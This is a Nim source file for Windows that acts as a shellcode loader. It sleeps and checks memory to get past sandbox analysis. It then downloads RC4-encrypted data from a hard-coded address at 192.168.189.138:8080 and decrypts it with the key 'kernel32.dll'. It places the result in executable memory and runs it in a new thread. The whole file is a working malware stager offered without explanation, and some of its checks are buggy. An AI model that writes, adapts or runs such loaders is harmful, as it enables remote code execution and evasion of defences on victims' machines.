import RC4
import httpclient
import winim/lean
import std/times, std/os, std/nativesockets

var
    old_protect : DWORD = PAGE_READWRITE
    client      = newHttpClient()
    shellcode   = newseq[byte]()
    data        : string
    key         : string = "kernel32.dll"
    dec         : string

func toByteSeq*(str: string): seq[byte] {.inline.} =
    @(str.toOpenArrayByte(0, str.high))


proc getMemoryInfo(): tuple[total, available: int64] =
    var memoryStatus: MEMORYSTATUSEX
    memoryStatus.dwLength = sizeof(MEMORYSTATUSEX).DWORD

    if GlobalMemoryStatusEx(addr memoryStatus) == 0:
        raise newException(OSError, "nop")
    return (total: memoryStatus.ullTotalPhys, available: memoryStatus.ullAvailPhys)


proc main(): void = 
    let start = cpuTime()
    sleep(5000)
    let elapsed = cpuTime() - start
    if elapsed < 4500:
        quit(0)

    let memInfo = getMemoryInfo()
    if memInfo.total < 1024 div (1024 * 1024):
        quit(0)
    else:
        data = client.getContent("http://192.168.189.138:8080/api_local")
        client.close()
        dec = fromRC4(key, data)
        shellcode = toByteSeq(dec)
        var shellcode_len = cast[SIZE_T](len(shellcode))
        var buffer = VirtualAlloc(nil, shellcode_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
        CopyMemory(buffer, &shellcode[0], shellcode_len);
        VirtualProtect(shellcode[0].addr, shellcode_len, PAGE_EXECUTE_READWRITE, oldProtect.addr)
        let create_thread : HANDLE = CreateThread(NULL, 0, cast[LPTHREAD_START_ROUTINE](buffer), NULL, 0, NULL)
        WaitForSingleObject(create_thread, INFINITE)
        CloseHandle(create_thread)

when isMainModule:
    main()
